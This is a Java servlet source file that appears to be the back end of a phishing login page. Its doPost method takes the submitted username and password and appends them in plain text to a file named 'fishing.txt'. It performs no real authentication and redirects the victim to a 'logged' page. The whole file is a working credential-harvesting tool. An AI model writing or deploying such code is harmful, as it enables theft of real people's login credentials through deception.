import java.io.*;

import javax.servlet.ServletConfig;
import javax.servlet.ServletException;
import javax.servlet.annotation.WebServlet;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;

@WebServlet("/LoginServlet")
public class LoginServlet extends HttpServlet {
    private static final long serialVersionUID = 1L;

    /**
     * @see HttpServlet#HttpServlet()
     */
    public LoginServlet() {
        super();
        // TODO Auto-generated constructor stub
    }

    public void init(ServletConfig config) throws ServletException {
        super.init(config);
    }

    //    post request comes from login in is clicked in login.jsp
    protected void doPost(HttpServletRequest request, HttpServletResponse response)
            throws ServletException, IOException {
        String userID = request.getParameter("uname");
        String password = request.getParameter("pass");

        //把用户名和密码写入文件
        if (userID != null && password != null) {
            //Default location is /usr/share/tomcat8/bin
            String file = "/home/lgl/fishing.txt";

            BufferedWriter out = null;
            try {
                out = new BufferedWriter(new OutputStreamWriter(
                        new FileOutputStream(file, true))); //true: append mode
                out.write("UserName: " + userID + "   " + "Password: " + password + "\r\n");
            } catch (Exception e){
                e.printStackTrace();
            } finally {
                try {
                    out.close();
                } catch (Exception e){
                    e.printStackTrace();
                }
            }
        }
        response.sendRedirect("logged/logged.html");
    }
}

